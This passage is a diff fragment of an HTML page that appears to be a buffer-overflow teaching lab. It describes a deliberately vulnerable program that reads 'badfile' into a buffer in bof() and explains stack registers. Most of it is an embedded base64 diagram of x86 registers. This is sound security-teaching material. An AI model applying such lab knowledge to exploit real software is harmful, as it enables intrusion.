+<span id="cb13-32"><a href="#cb13-32"></a>    <span class="cf">return</span> <span class="dv">1</span><span class="op">;</span></span>
+<span id="cb13-33"><a href="#cb13-33"></a><span class="op">}</span></span></code></pre></div>
 <p>The above program has a buffer overflow vulnerability. It first reads
 an input from a file called <code>badfile</code>, and then passes this
 input to another buffer in the function <code>bof()</code>. The original
@@ -872,7 +907,7 @@ starts off being equal to the <code>ebp</code> register. As memory is
 allocated for local variables, the <code>esp</code> register will get
 decremented.</p></li>
 </ul>
-<p><div style="display: flex; justify-content: center;"> <img src="data:image/png;base64,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" title="x86 registers" style="width:60.0%" /> </div>
+<p><div style="display: flex; justify-content: center;"> <img role="img" src="data:image/png;base64,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